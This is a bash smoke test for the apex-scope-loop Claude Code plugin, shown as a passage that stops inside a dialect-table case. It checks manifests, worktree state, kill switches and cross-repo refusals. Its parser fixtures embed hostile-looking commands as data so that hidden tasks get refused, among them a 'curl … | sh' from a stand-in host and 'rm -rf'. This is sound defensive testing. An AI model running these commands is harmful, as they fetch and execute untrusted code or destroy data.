#!/usr/bin/env bash
# apex-scope-loop structural smoke test
# Verifies the plugin contract from ADR-0001 (checks 1-10), ADR-0002 (11-13) and ADR-0003 (14+). Exits non-zero on first failure.
set -euo pipefail

PLUGIN_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
fail() { echo "smoke FAIL: $1" >&2; exit 1; }
ok()   { echo "smoke OK:   $1"; }
# has PATTERN TEXT — grep TEXT without a pipe (grep -q closing a pipe early
# would SIGPIPE the writer under pipefail and fail the check at random).
has() { grep -q -- "$1" <<<"$2"; }

# 1. plugin.json exists and has required fields
PJ="$PLUGIN_ROOT/.claude-plugin/plugin.json"
[ -f "$PJ" ] || fail "missing $PJ"
for k in name version description author keywords; do
  grep -q "\"$k\"" "$PJ" || fail "plugin.json missing key: $k"
done
ok "plugin.json has name/version/description/author/keywords"

# 2. plugin.json does NOT enumerate skills/commands/agents arrays
for forbidden in '"skills"' '"commands"' '"agents"'; do
  if grep -q "$forbidden[[:space:]]*:[[:space:]]*\[" "$PJ"; then
    fail "plugin.json enumerates $forbidden array (must be auto-discovered)"
  fi
done
ok "plugin.json does not enumerate skills/commands/agents"

# 3 & 4. Both SKILL.md files have valid kebab-case name
for skill in apex-plan apex-execute; do
  S="$PLUGIN_ROOT/skills/$skill/SKILL.md"
  [ -f "$S" ] || fail "missing skill: $S"
  # Extract name: line from frontmatter (must be unquoted kebab-case)
  name_line=$(awk '/^---$/{c++; next} c==1 && /^name:/{print; exit}' "$S")
  [ -n "$name_line" ] || fail "$skill SKILL.md missing name: frontmatter"
  [[ "$name_line" =~ ^name:[[:space:]]+$skill[[:space:]]*$ ]] \
    || fail "$skill SKILL.md name: must be kebab-case '$skill' (got: $name_line)"
  ok "$skill SKILL.md frontmatter is valid"
done

# 5. No wildcard tools in any SKILL.md
for s in "$PLUGIN_ROOT"/skills/*/SKILL.md; do
  if grep -qE "allowed-tools:.*(\\*|mcp__\\*)" "$s"; then
    fail "$s has wildcard in allowed-tools"
  fi
done
ok "no wildcard tools in skills"

# 6. Both commands present with valid frontmatter
for cmd in start iterate; do
  C="$PLUGIN_ROOT/commands/$cmd.md"
  [ -f "$C" ] || fail "missing command: $C"
  grep -qE "^name:[[:space:]]+$cmd[[:space:]]*$" "$C" \
    || fail "$cmd command frontmatter missing or invalid name:"
  grep -q "^description:" "$C" || fail "$cmd command missing description"
done
ok "commands start + iterate present with valid frontmatter"

# 7. plan-author agent present with model: sonnet
A="$PLUGIN_ROOT/agents/plan-author.md"
[ -f "$A" ] || fail "missing agent: $A"
grep -qE "^name:[[:space:]]+plan-author[[:space:]]*$" "$A" || fail "plan-author missing name"
grep -qE "^model:[[:space:]]+sonnet[[:space:]]*$" "$A" || fail "plan-author missing model: sonnet"
ok "plan-author agent present with model: sonnet"

# 8. README has required sections
R="$PLUGIN_ROOT/README.md"
[ -f "$R" ] || fail "missing README.md"
for section in "Compatibility" "Namespace coordination" "Verification" "Architecture Decisions"; do
  grep -q "## $section" "$R" || fail "README missing section: $section"
done
ok "README has Compatibility/Namespace/Verification/ADR sections"

# 9. ADR-0001 exists with Status: Proposed
ADR="$PLUGIN_ROOT/docs/adrs/0001-apex-scope-loop-contract.md"
[ -f "$ADR" ] || fail "missing ADR-0001"
grep -qE "^- \*\*Status:\*\* Proposed" "$ADR" || fail "ADR-0001 not in Proposed status"
ok "ADR-0001 exists with Status: Proposed"

# 10. All .sh scripts in skills/ and scripts/ are executable
non_exec=$(find "$PLUGIN_ROOT/skills" "$PLUGIN_ROOT/scripts" -name "*.sh" \! -perm -u+x 2>/dev/null || true)
if [ -n "$non_exec" ]; then
  fail "non-executable .sh files found: $non_exec"
fi
ok "all .sh scripts are executable"

# 11. gibson-reviewer agent (ADR-0002) present, with a model and a VERDICT contract
GR="$PLUGIN_ROOT/agents/gibson-reviewer.md"
[ -f "$GR" ] || fail "missing agent: $GR"
grep -qE "^name:[[:space:]]+gibson-reviewer[[:space:]]*$" "$GR" || fail "gibson-reviewer missing name"
grep -qE "^model:[[:space:]]+[a-z]+" "$GR" || fail "gibson-reviewer missing model:"
grep -q "VERDICT: APPROVE" "$GR" || fail "gibson-reviewer does not define the VERDICT contract"
ok "gibson-reviewer agent present with model + VERDICT contract"

# 12. Harness scripts present and The Gibson credited
for s in green-gate risk-tier lessons; do
  [ -f "$PLUGIN_ROOT/skills/apex-execute/scripts/$s.sh" ] || fail "missing harness script: $s.sh"
done
grep -q "The Gibson" "$PLUGIN_ROOT/NOTICE" 2>/dev/null || fail "NOTICE missing or does not credit The Gibson"
ok "harness scripts present; NOTICE credits The Gibson"

# 13. ADR-0002 exists with Status: Proposed
ADR2="$PLUGIN_ROOT/docs/adrs/0002-gibson-harness.md"
[ -f "$ADR2" ] || fail "missing ADR-0002"
grep -qE "^- \*\*Status:\*\* Proposed" "$ADR2" || fail "ADR-0002 not in Proposed status"
ok "ADR-0002 exists with Status: Proposed"

# 14. Portability (ADR-0003): no repo-local .claude/skills paths in commands, skills or agents
hits=$(grep -rnE '\.claude/skills/apex-(execute|plan)/' "$PLUGIN_ROOT/commands" "$PLUGIN_ROOT/skills" "$PLUGIN_ROOT/agents" 2>/dev/null || true)
[ -z "$hits" ] || fail "repo-local .claude/skills path (breaks marketplace installs): $hits"
[ ! -e "$PLUGIN_ROOT/skills/apex-execute/resources/templates/hooks-snippet.json" ] || fail "hooks-snippet.json must stay deleted (it pointed at a non-existent guardrail)"
ok "no .claude/skills paths; hooks-snippet.json removed"

# 15-16. Functional: a plan promoted in a scratch repo, then resolved from the
# base checkout and from inside the plan worktree, lands on ONE state dir.
# The functional checks must not inherit the caller's loop configuration.
for v in $(compgen -e | grep '^APEX_' || true); do unset "$v"; done
SMOKE_TMP="$(mktemp -d "${TMPDIR:-/tmp}/apex-scope-loop-smoke.XXXXXX")"
trap 'git -C "$SMOKE_TMP/repo" worktree prune >/dev/null 2>&1 || true; rm -rf "$SMOKE_TMP"' EXIT
[ -n "${SMOKE_KEEP:-}" ] && trap - EXIT
export GIT_AUTHOR_NAME=smoke GIT_AUTHOR_EMAIL=smoke@example.invalid GIT_COMMITTER_NAME=smoke GIT_COMMITTER_EMAIL=smoke@example.invalid
R="$SMOKE_TMP/repo"; mkdir -p "$R/.claude/tasks" "$R/.claude/plans"
git -C "$R" init -q -b main
cat >"$R/.claude/tasks/demo-adr.md" <<'ADR'
# ADR: demo
**Status**: Accepted
ADR
cp "$PLUGIN_ROOT/skills/apex-execute/resources/examples/sample-plan.md" "$R/.claude/plans/demo-plan.md"
git -C "$R" add -A && git -C "$R" commit -qm init
EX="$PLUGIN_ROOT/skills/apex-execute/scripts"
( cd "$R" && APEX_GIBSON=0 APEX_MEMORY_CMD= "$PLUGIN_ROOT/skills/apex-plan/scripts/promote-to-loop.sh" demo >"$SMOKE_TMP/promote.log" 2>&1 ) \
  || fail "promote-to-loop.sh failed in a repo with no .claude/skills copy: $(tail -3 "$SMOKE_TMP/promote.log")"
ok "promote-to-loop resolves init.sh plugin-relatively (no .claude/skills copy)"

# brief DIR PLAN — iterate.sh's full brief, captured before any grep (grep -q
# closing the pipe early would SIGPIPE iterate.sh under pipefail).
# The exit code is kept as a final "__RC__: n" line so crashes are visible.
brief() { local o rc=0; o="$( (cd "$1" && "$EX/iterate.sh" "$2") 2>&1)" || rc=$?; printf '%s\n__RC__: %s\n' "$o" "$rc"; }

st() { # st DIR PLAN — the STATE line iterate.sh reports for PLAN when run from DIR
  ( cd "$1" && "$EX/iterate.sh" "$2" 2>&1 | sed -n 's/^STATE: //p' | head -1 ) || true
}
S_BASE="$(st "$R" .claude/plans/demo-plan.md)"
WTP="$( (cd "$R" && "$EX/iterate.sh" .claude/plans/demo-plan.md 2>&1 | sed -n 's/^WORKTREE: //p') || true)"
[ -n "$WTP" ] && [ -d "$WTP" ] || fail "iterate.sh did not report a plan worktree"
S_WT_PLAN="$(st "$WTP" "$WTP/.claude/plans/demo-plan.md")"
S_WT_CWD="$(st "$WTP" "$R/.claude/plans/demo-plan.md")"
ln -s "$R" "$SMOKE_TMP/link"
S_LINK="$(st "$SMOKE_TMP/link" .claude/plans/demo-plan.md)"
[ -n "$S_BASE" ] && [ "$S_BASE" = "$S_WT_PLAN" ] && [ "$S_BASE" = "$S_WT_CWD" ] && [ "$S_BASE" = "$S_LINK" ] \
  || fail "state dir differs: base=$S_BASE worktree-plan=$S_WT_PLAN worktree-cwd=$S_WT_CWD symlink=$S_LINK"
ok "one state dir from the base checkout, the plan worktree and a symlinked path"

# 17. Kill switches: a HALT in the checkout you run from, and a shared HALT, both stop the loop.
LW="$SMOKE_TMP/linked"; git -C "$R" worktree add -q -b linked "$LW" main
mkdir -p "$LW/gibson" && touch "$LW/gibson/HALT"
has '^STATUS: HALTED' "$(brief "$LW" "$R/.claude/plans/demo-plan.md")" \
  || fail "gibson/HALT in the linked worktree being run from was ignored"
rm -f "$LW/gibson/HALT"; touch "$R/.dev-plan-state/HALT"
has '^STATUS: HALTED' "$(brief "$LW" "$R/.claude/plans/demo-plan.md")" \
  || fail "shared .dev-plan-state/HALT was ignored from a linked worktree"
rm -f "$R/.dev-plan-state/HALT"
ok "checkout-local and shared kill switches both halt"

# 18. Outside git (APEX_NO_WORKTREE=1): init and iterate agree; same-named plans stay separate.
NG="$SMOKE_TMP/nogit"; mkdir -p "$NG/a" "$NG/b"
cp "$R/.claude/plans/demo-plan.md" "$NG/a/plan.md"; cp "$R/.claude/plans/demo-plan.md" "$NG/b/plan.md"
( cd "$NG" && APEX_NO_WORKTREE=1 APEX_GIBSON=0 "$EX/init.sh" a/plan.md >/dev/null && APEX_NO_WORKTREE=1 APEX_GIBSON=0 "$EX/init.sh" b/plan.md >/dev/null ) \
  || fail "init.sh failed outside git with APEX_NO_WORKTREE=1"
has '^STATUS: READY' "$(brief "$NG" a/plan.md)" || fail "iterate.sh outside git does not find the state init.sh wrote"
[ "$(st "$NG" a/plan.md)" != "$(st "$NG" b/plan.md)" ] || fail "two plans named plan.md share one state dir outside git"
ok "non-git mode: init/iterate agree and same-named plans do not collide"

# indir DIR CMD... — run CMD in DIR (portable stand-in for GNU `env -C`).
indir() { local d="$1"; shift; ( cd "$d" && env "$@" ); }
# expect_refusal LABEL PATTERN CMD... — CMD must fail and say PATTERN.
expect_refusal() {
  local label="$1" pat="$2" out; shift 2
  if out="$("$@" 2>&1)"; then fail "$label: expected a refusal, got success"; fi
  has "$pat" "$out" || fail "$label: refused for the wrong reason: $(printf '%s' "$out" | tail -2)"
}

# 19. A run is never silently taken over: re-init from another checkout with a
#     different base refuses; same base keeps the run's history.
expect_refusal "retarget to another base" "Refusing to retarget" \
  indir "$LW" APEX_BASE_BRANCH=linked "$EX/init.sh" "$R/.claude/plans/demo-plan.md"
python3 - "$S_BASE/checkpoint.json" <<'PY'
import json, sys
p = sys.argv[1]; s = json.load(open(p)); s.setdefault("reviews", {})["99"] = {"sha": "x", "verdict": "APPROVE"}; json.dump(s, open(p, "w"))
PY
( cd "$R" && APEX_GIBSON=0 "$EX/init.sh" .claude/plans/demo-plan.md >/dev/null 2>&1 ) || fail "same-base re-init failed"
python3 -c 'import json,sys; sys.exit(0 if "99" in json.load(open(sys.argv[1])).get("reviews",{}) else 1)' "$S_BASE/checkpoint.json" \
  || fail "same-base re-init discarded the run's reviews"
ok "init refuses takeover; re-init keeps run history"

# 20. APEX_STATE_ROOT moves state only, is made absolute, and is keyed per repository.
cp "$R/.claude/plans/demo-plan.md" "$R/.claude/plans/rel-plan.md"
( cd "$R" && APEX_STATE_ROOT=rel-root APEX_GIBSON=0 "$EX/init.sh" .claude/plans/rel-plan.md >/dev/null 2>&1 ) || fail "init.sh with a relative APEX_STATE_ROOT failed"
A1="$(APEX_STATE_ROOT=rel-root st "$R" .claude/plans/rel-plan.md)"
A2="$(APEX_STATE_ROOT="$R/rel-root" st "$R/.claude" plans/rel-plan.md)"
case "$A1" in /*) ;; *) fail "APEX_STATE_ROOT state dir is not absolute: '$A1'" ;; esac
[ "$A1" = "$A2" ] || fail "relative APEX_STATE_ROOT split state: $A1 vs $A2"
ok "APEX_STATE_ROOT is absolute and stable across working directories"

# 21. One repository, proven: every acting script refuses another repo's plan,
#     even when the caller's repo runs a same-path plan; reporting scripts warn.
O="$SMOKE_TMP/other"; git init -q -b main "$O"; mkdir -p "$O/.claude/plans"
cp "$R/.claude/plans/demo-plan.md" "$O/.claude/plans/demo-plan.md"
git -C "$O" add -A && git -C "$O" commit -qm o
( cd "$O" && APEX_GIBSON=0 "$EX/init.sh" .claude/plans/demo-plan.md >/dev/null 2>&1 ) || fail "init in the second repo failed"
O_HEAD="$(git -C "$O" rev-parse main)"
RP="$R/.claude/plans/demo-plan.md"
expect_refusal "init.sh cross-repo"       "repository mismatch.*refusing to act" indir "$O" "$EX/init.sh" "$RP"
expect_refusal "land.sh cross-repo"       "repository mismatch.*refusing to act" indir "$O" "$EX/land.sh" "$RP" --force
expect_refusal "checkpoint.sh cross-repo" "repository mismatch.*refusing to act" indir "$O" "$EX/checkpoint.sh" "$RP" halt x
expect_refusal "green-gate.sh cross-repo" "repository mismatch.*refusing to act" indir "$O" "$EX/green-gate.sh" "$RP" check
expect_refusal "risk-tier.sh cross-repo"  "repository mismatch.*refusing to act" indir "$O" "$EX/risk-tier.sh" "$RP" 1
IT_OUT="$( (cd "$O" && "$EX/iterate.sh" "$RP" 2>/dev/null) || true)"
has '^STATUS: ERROR repository mismatch' "$IT_OUT" || fail "iterate.sh cross-repo did not report STATUS: ERROR repository mismatch"
[ "$(git -C "$O" rev-parse main)" = "$O_HEAD" ] || fail "a cross-repo call moved the other repo's main"
ST_OUT="$( (cd "$O" && "$EX/status.sh" "$RP" 2>&1) || true)"
has 'WARNING: repository mismatch' "$ST_OUT" || fail "status.sh did not warn on a cross-repo plan"
ok "acting scripts refuse another repository's plan; status warns"

# 22. Branches are per plan; a foreign same-name branch is never adopted; a
#     deleted worktree is recreated by init.
B1="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["worktree_branch"])' "$S_BASE/checkpoint.json")"
mkdir -p "$R/other"; cp "$RP" "$R/other/demo-plan.md"
( cd "$R" && APEX_GIBSON=0 "$EX/init.sh" other/demo-plan.md >/dev/null 2>&1 ) || fail "init of a same-slug plan failed"
B2="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["worktree_branch"])' "$(st "$R" other/demo-plan.md)/checkpoint.json")"
[ "$B1" != "$B2" ] || fail "two same-slug plans share branch $B1"
cp "$RP" "$R/.claude/plans/fresh-plan.md"
FRESH_STATE="$(cd "$R" && source "$EX/_lib.sh" && apex_resolve .claude/plans/fresh-plan.md && echo "$STATE_DIR")"
git -C "$R" branch "apex-scope-loop/fresh-$(basename "$FRESH_STATE")" main
expect_refusal "adopt foreign branch" "refusing to adopt" indir "$R" APEX_GIBSON=0 "$EX/init.sh" .claude/plans/fresh-plan.md
WT2="$(st "$R" other/demo-plan.md)/worktree"
rm -rf "$WT2"
( cd "$R" && APEX_GIBSON=0 "$EX/init.sh" other/demo-plan.md >/dev/null 2>&1 ) || fail "re-init after deleting the worktree failed"
[ -d "$WT2" ] && [ "$(git -C "$WT2" symbolic-ref -q HEAD)" = "refs/heads/$B2" ] || fail "deleted worktree was not recreated on its branch"
ok "per-plan branches; foreign branch refused; deleted worktree recreated"

# 23. land.sh: refuses from the wrong checkout and with unrelated base changes,
#     without modifying anything; lands the exact worktree head otherwise.
L="$SMOKE_TMP/landrepo"; mkdir -p "$L/plans"; git init -q -b main "$L"
printf -- '- [x] **Phase 1.1** [docs] done\n  - Acceptance: true\n' >"$L/plans/l-plan.md"; echo base >"$L/tracked.txt"
git -C "$L" add -A && git -C "$L" commit -qm base
( cd "$L" && APEX_GIBSON=0 "$EX/init.sh" plans/l-plan.md >/dev/null 2>&1 ) || fail "init for the land test failed"
LWT="$(cd "$L" && "$EX/iterate.sh" plans/l-plan.md | sed -n 's/^WORKTREE: //p')"
[ -n "$LWT" ] || LWT="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["worktree_path"])' "$(st "$L" plans/l-plan.md)/checkpoint.json")"
echo feature >"$LWT/feature.txt"; git -C "$LWT" add -A; git -C "$LWT" commit -qm feature
LH="$(git -C "$LWT" rev-parse HEAD)"; MAIN0="$(git -C "$L" rev-parse main)"
expect_refusal "land from inside the plan worktree" "run land.sh from there" indir "$LWT" APEX_GIBSON=0 "$EX/land.sh" "$L/plans/l-plan.md"
echo dirty >>"$L/tracked.txt"
expect_refusal "land with unrelated base changes" "unrelated to this plan" indir "$L" APEX_GIBSON=0 "$EX/land.sh" plans/l-plan.md
[ "$(git -C "$L" rev-parse main)" = "$MAIN0" ] && [ "$(git -C "$LWT" rev-parse HEAD)" = "$LH" ] || fail "a refused land modified a branch"
git -C "$L" checkout -q -- tracked.txt
( cd "$L" && APEX_GIBSON=0 "$EX/land.sh" plans/l-plan.md >/dev/null 2>&1 ) || fail "land.sh failed on a ready plan"
git -C "$L" merge-base --is-ancestor "$LH" main || fail "land.sh did not merge the worktree head"
ok "land.sh refuses safely and merges the exact worktree head"

# 24. Every script that sources _lib.sh resolves (and so guards) before reading state.
for f in "$EX"/*.sh "$PLUGIN_ROOT"/skills/apex-plan/scripts/*.sh; do
  grep -q '_lib.sh"' "$f" || continue
  awk '/apex_resolve "\$PLAN"/{r=1} /read_field |\$CHECKPOINT/{ if(!r){bad=1; exit} } END{exit bad}' "$f" \
    || fail "$(basename "$f") reads state before apex_resolve"
done
ok "every _lib.sh user resolves before reading state"

# 25. Plan parsing (planlib.py, the one parser): widened tags, 8-line look-ahead
#     with six directives, Blocked-by forms, next-unblocked selection, fail-closed
#     unknown references, validation (Route/Budget values, lanes need Paths, cycles).
PL="$EX/planlib.py"; P25="$SMOKE_TMP/p25.md"
cat >"$P25" <<'PLAN'
- [x] **Phase 1.1** [docs] done
  - Acceptance: true
- [ ] **Phase 1.2** [backend][gate:partner:x@y.com] waits on 1.3
  - Acceptance: true
  - Blocked-by: **Phase 1.3**
- [ ] **Phase 1.3 — six directives** [tests] all six directives, see [docs](x.md)
  - Acceptance: `pytest -q`
  - Notes: directives may sit anywhere in the first eight lines
  - Blocked-by: phase-1.1
  - Swarm: single [coder]
  - Route: class=tests provider=auto fanout=lanes review=solo
  - Paths: tests/a/**
  - Budget: usd=2 spawns=3 minutes=20
- [ ] **Phase 1.4** [tests] lane two
  - Acceptance: true
  - Route: fanout=lanes
  - Paths: src/b/**
- [ ] **Phase 1.5** [docs] waits on a gate that does not exist
  - Acceptance: true
  - Blocked-by: Gate 9→10
PLAN
python3 - "$PL" "$P25" <<'PY' || fail "planlib next: wrong selection or parsing"
import json, subprocess, sys
d = json.loads(subprocess.check_output([sys.executable, sys.argv[1], "next", sys.argv[2]]))
t = d["task"]
assert d["status"] == "READY" and t["id"] == "Phase 1.3", d
assert t["acceptance"] == "pytest -q" and t["swarm"] == "single [coder]", t
assert t["route"] == {"class": "tests", "provider": "auto", "fanout": "lanes", "review": "solo"}, t["route"]
assert t["paths"] == ["tests/a/**"] and t["budget"] == {"usd": "2", "spawns": "3", "minutes": "20"}, t
assert d["lanes"] == [t["line_no"], t["line_no"] + 8], d["lanes"]
blocked = {b["id"]: b for b in d["blocked"]}
assert blocked["Phase 1.2"]["open"] == ["Phase 1.3"], blocked
assert blocked["Phase 1.5"]["unknown"] == ["Gate 9→10"], blocked
tags = json.loads(subprocess.check_output([sys.executable, sys.argv[1], "task", sys.argv[2], "3"]))["tags"]
assert tags == ["backend", "gate:partner:x@y.com"], tags
assert "docs" not in t["tags"] and t["tags"] == ["tests"], t["tags"]   # [docs](x.md) is link text
PY
python3 "$PL" next "$EX/../resources/examples/sample-plan.md" | python3 -c 'import json,sys; d=json.load(sys.stdin); assert d["task"]["id"]=="Phase 1.1" and any(b["id"]=="Phase 1.2" and b["open"]==["Phase 1.1"] for b in d["blocked"]), d' \
  || fail "sample-plan: **Phase 1.2** Blocked-by phase-1.1 is not resolved"
V="$(python3 "$PL" validate "$P25" || true)"
has "Blocked-by 'Gate 9→10' does not name a task" "$V" || fail "validate missed an unknown Blocked-by"
printf -- '- [ ] **Phase 1.1** [x] a\n  - Acceptance: true\n  - Blocked-by: phase-1.2\n  - Route: class=nope fanout=lanes\n  - Budget: usd=-1\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n  - Blocked-by: phase-1.1\n' >"$SMOKE_TMP/bad.md"
V="$(python3 "$PL" validate "$SMOKE_TMP/bad.md" || true)"
for want in "Route class=nope" "fanout=lanes requires a Paths" "Budget usd=-1" "Blocked-by cycle"; do
  has "$want" "$V" || fail "validate missed: $want"
done
# Fail-closed parsing: fenced examples are not tasks; repeated Blocked-by
# lines merge; a duplicated id blocks until every copy is checked; '..' and
# absolute Paths never count as disjoint; line numbers match sed's.
cat >"$SMOKE_TMP/fc.md" <<'PLAN'
- [ ] **Phase 1.1** [docs] real
  - Acceptance: true
- [x] **Phase 1.2** [docs] done
  - Acceptance: true
- [ ] **Phase 2.1** [docs] two Blocked-by lines
  - Acceptance: true
  - Blocked-by: Phase 1.1
  - Blocked-by: Phase 1.2
- [x] **Phase 3.1** dup done
  - Acceptance: true
- [ ] **Phase 3.1** dup open
  - Acceptance: true
- [ ] **Phase 3.2** waits on a duplicated id
  - Acceptance: true
  - Blocked-by: Phase 3.1
PLAN
python3 - "$PL" "$SMOKE_TMP/fc.md" <<'PY' || fail "planlib fail-closed parsing"
import json, subprocess, sys
pl, p = sys.argv[1:]
d = json.loads(subprocess.check_output([sys.executable, pl, "next", p]))
assert d["task"]["id"] == "Phase 1.1" and d["task"]["line_no"] == 1, d["task"]
b = {x["id"]: x for x in d["blocked"]}
assert b["Phase 2.1"]["open"] == ["Phase 1.1"], b
assert b["Phase 3.2"]["open"] == ["Phase 3.1"], b
sys.dont_write_bytecode = True
sys.path.insert(0, pl.rsplit("/", 1)[0]); import planlib
assert not planlib.disjoint(["src/a/../shared/*.py"], ["src/shared/util.py"])
assert not planlib.disjoint(["/repo/src/**"], ["src/**"]) and not planlib.disjoint(["../x/**"], ["y/**"])
assert not planlib.disjoint(["src/a/**/../../b/x.py"], ["b/x.py"]) and not planlib.disjoint(["src/a/[.][.]/../b/x.py"], ["b/x.py"])
assert not planlib.disjoint(["Src/A/**"], ["src/a/x.py"])
assert planlib.disjoint(["src/a/**"], ["src/b/**"])
PY
printf 'line one \342\200\250 has U+2028\n- [ ] **Phase 1.1** A\n  - Acceptance: true\n- [ ] **Phase 1.2** B\n  - Acceptance: true\n' >"$SMOKE_TMP/ls.md"
# Every character str.splitlines would break on (U+2028, \v, \f, \x1c-\x1e,
# U+0085) is whitespace, so it is refused: line numbers cannot drift from sed's.
has "U+2028" "$(python3 "$PL" validate "$SMOKE_TMP/ls.md" 2>&1 || true)" || fail "a U+2028 line separator was not refused"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  - Acceptance: false\n  - N1: x\n  - N2: x\n  - N3: x\n  - N4: x\n  - N5: x\n  - N6: x\n  - Blocked-by: Phase 1.1\n\n  - Swarm: single\n' >"$SMOKE_TMP/late.md"
V="$(python3 "$PL" validate "$SMOKE_TMP/late.md" || true)"
for want in "Acceptance: given more than once" "beyond the 8-line look-ahead" "directive outside any task block"; do
  has "$want" "$V" || fail "validate missed: $want"
done
# Nothing is ever hidden: every column-0 "- [ ]" line is a task, and markdown
# structure can only make a plan invalid (fail closed), never drop a task or
# let example text supply a command.
fx() { printf '%b' "$2" >"$SMOKE_TMP/$1.md"; python3 "$PL" next "$SMOKE_TMP/$1.md" | python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["status"], (d.get("task") or {}).get("id"))'; }
vx() { python3 "$PL" validate "$SMOKE_TMP/$1.md" 2>&1 || true; }
[ "$(fx f1 '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n```x``` marks inline code\n\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n')" = "READY Phase 1.2" ] || fail "inline code at line start opened a fence"
[ "$(fx f2 '- [x] **Phase 1.1** a\n  - Acceptance: true\n```\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n')" = "ERROR None" ] || fail "an unclosed fence did not make the plan an error"
[ "$(fx f3 '~~~\n```\n- [ ] **Phase 9** x\n  - Acceptance: rm -rf x\n~~~\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n')" = "ERROR None" ] || fail "a task line inside a fence was not refused"
[ "$(fx f4 '````\n```\n- [ ] **Phase 9** x\n  - Acceptance: rm -rf x\n````\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n')" = "ERROR None" ] || fail "a task line inside a four-backtick fence was not refused"
[ "$(fx f6 '<!--\n- [ ] **Phase 9.1** commented out\n  - Acceptance: rm -rf x\n-->\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n')" = "ERROR None" ] || fail "a task line inside an HTML comment was not refused"
[ "$(fx f7 '<!-- never closed\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n')" = "ERROR None" ] || fail "an unclosed HTML comment did not make the plan an error"
[ "$(fx f8 '        ```\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n        ```\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n')" = "ERROR None" ] || fail "a task between indented fence lines was not refused"
# Raw HTML anywhere outside code is refused, inline <!-- included (renderers
# that pass HTML through emit it unbalanced and hide what follows).
[ "$(fx f10 'Templates must not emit a bare <!-- marker.\n\n- [ ] **Phase 1.1** a\n  - Acceptance: true\n\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n\na --> arrow\n')" = "ERROR None" ] || fail "an inline <!-- was not refused"
[ "$(fx f11 '- [x] **Phase 1.1** a\n  - Acceptance: true\n  ```sh\n  make a\n     ```\n- [ ] **Phase 1.2** must still run\n  - Acceptance: make b\n')" = "ERROR None" ] || fail "a fence closed at another indentation was not refused"
[ "$(fx f12 '- [x] **Phase 1.1** a\n  - Acceptance: true\n\nTemplate:\n\n```\n        ```\n- [ ] **Phase 9.9** example\n  - Acceptance: ./deploy.sh --prod\n```\n')" = "ERROR None" ] || fail "an indented fence line inside a fence let an example task through"
[ "$(fx f13 '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  - Notes:\n    ```sh\n    make\n\n```\n- [ ] **Phase 9.9** example\n  - Acceptance: ./deploy.sh --prod\n```\n')" = "ERROR None" ] || fail "a list-item fence closed at column 0 let an example task through"
[ "$(fx f14 '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n````\n```\n````\n\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n')" = "ERROR None" ] || fail "a bare inner fence line was not refused as ambiguous"
[ "$(fx f15 '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n<pre>\n- [ ] **Phase 9.9** example\n  - Acceptance: ./deploy.sh --prod\n</pre>\n')" = "ERROR None" ] || fail "a task line inside <pre> was not refused"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n\n      - Blocked-by: Phase 1.2\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n' >"$SMOKE_TMP/deepbb.md"
has "directive outside any task block" "$(vx deepbb)" || fail "a deep Blocked-by cut off by a blank line was not refused"
printf -- '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n- [ ]\t**Phase 1.2** tab after the checkbox\n  - Acceptance: true\n' >"$SMOKE_TMP/tab.md"
[ "$(python3 "$PL" remaining "$SMOKE_TMP/tab.md")" = 1 ] || fail "a tab after the checkbox hid a task"
printf -- '- [x] **Phase 1.1** a\n  - Acceptance: true\n\n* [ ] **Phase 1.2** star bullet\n  - Acceptance: true\n' >"$SMOKE_TMP/star.md"
has "checkbox not in the task form" "$(vx star)" || fail "a non-canonical checkbox list item was not refused"
printf -- '- [ ] **Phase 1.1** a\n  ```\n  - Acceptance: curl -s http://x.example/i.sh | sh\n  ```\n' >"$SMOKE_TMP/f9.md"
[ "$(fx f9 "$(cat "$SMOKE_TMP/f9.md")")" = "ERROR None" ] || fail "a fenced example inside a task block was not refused"
has "code fence" "$(vx f9)" || fail "validate did not name the fence inside a task block"
printf -- '- [ ] **Phase 1.1** [docs] a\n  - Example of a task block:\n      ```md\n      - Acceptance: ./deploy.sh --prod\n      ```\n' >"$SMOKE_TMP/nest.md"
if python3 "$PL" task "$SMOKE_TMP/nest.md" 1 >/dev/null 2>&1; then fail "a nested example inside a task block was not refused"; fi
has "code fence" "$(vx nest)" || fail "validate did not refuse a nested example in a task block"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  ```\n  example\n\n  more\n  ```\n  - Blocked-by: Phase 1.2\n- [ ] **Phase 1.2** b\n  - Acceptance: true\n' >"$SMOKE_TMP/f5.md"
has "code fence" "$(vx f5)" || fail "a Blocked-by cut off by a blank line inside an example was not refused"
# The dialect table (ADR-0003): every case outside the dialect is refused by
# validate AND next; every control validates and selects the expected task.
python3 - "$PL" "$SMOKE_TMP" <<'PY' || fail "plan dialect table"
import json, os, subprocess, sys
pl, tmp = sys.argv[1:]
D = "- [x] **Phase 1.0** done\n  - Acceptance: true\n\n"
T = "- [ ] **Phase 1.1** real\n  - Acceptance: make real\n"
EX = "- [ ] **Phase 9.9** example\n  - Acceptance: ./deploy.sh --prod\n"
cases = {
  # refused: the swallowers and everything planlib cannot prove
  "details":   (D + "<details><summary>t</summary>\n```\n\nCopy:\n```\n" + EX + "```\n</details>\n```\n```\n", None),
  "details-d1":("- [x] **Phase 1.1** [docs] done\n  - Acceptance: true\n\n<details><summary>Task template</summary>\n```\n\nCopy this block into the plan:\n```\n- [ ] **Phase 9.9** [docs] example task\n  - Acceptance: ./deploy.sh --prod\n```\n</details>\n```\n", None),
